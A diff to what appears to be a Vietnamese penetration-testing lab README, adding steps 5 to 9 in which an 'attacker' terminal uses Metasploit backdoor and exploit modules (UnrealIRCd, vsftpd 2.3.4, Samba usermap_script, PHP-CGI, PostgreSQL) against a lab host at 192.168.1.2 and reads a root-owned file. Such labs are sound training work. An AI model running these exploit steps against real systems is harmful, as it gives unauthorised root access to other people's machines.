@@ -65,12 +65,142 @@ run
 ```
 cat /root/filetoview.txt
 ```
+(Nhấn Ctrl+C)
+
+#### Bước 5:
+Trên terminal **`attacker`** nhập :
+```
+sudo msfconsole
+```
+Chờ chạy xong nhập:
+```
+search unreal_ircd
+```
 
 ```
-exit
+use exploit/unix/irc/unreal_ircd_3281_backdoor
 ```
 
+```
+set RHOST 192.168.1.2
+```
 
+```
+run
+```
+
+```
+cat /root/filetoview.txt
+```
+(Nhấn Ctrl+C)
+
+#### Bước 6:
+Trên terminal **`attacker`** nhập :
+```
+sudo msfconsole
+```
+Chờ chạy xong nhập:
+```
+search vsftpd_234
+```
+
+```
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+```
+set RHOST 192.168.1.2
+```
+
+```
+run
+```
+
+```
+cat /root/filetoview.txt
+```
+(Nhấn Ctrl+C)
+
+#### Bước 7:
+Trên terminal **`attacker`** nhập :
+```
+sudo msfconsole
+```
+Chờ chạy xong nhập:
+```
+search usermap_script
+```
+
+```
+use exploit/multi/samba/usermap_script
+```
+
+```
+set RHOST 192.168.1.2
+```
+
+```
+run
+```
+
+```
+cat /root/filetoview.txt
+```
+(Nhấn Ctrl+C)
+
+#### Bước 8:
+Trên terminal **`attacker`** nhập :
+```
+sudo msfconsole
+```
+Chờ chạy xong nhập:
+```
+search php_cgi
+```
+
+```
+use exploit/multi/http/php_cgi_arg_injection
+```
+
+```
+set RHOST 192.168.1.2
+```
+
+```
+run
+```
+
+```
+cat /root/filetoview.txt
+```
+(Nhấn Ctrl+C)
+
+#### Bước 9:
+Trên terminal **`attacker`** nhập :
+```
+sudo msfconsole
+```
+Chờ chạy xong nhập:
+```
+search postgres_payload
+```
+
+```
+use exploit/linux/postgres/postgres_payload
+```
+
+```
+set RHOST 192.168.1.2
+```
+
+```
+run
+```
+
+```
+cat /root/filetoview.txt
+```
+(Nhấn Ctrl+C)
 
 ## 📌 Bản quyền & Ghi công (Credits)
 
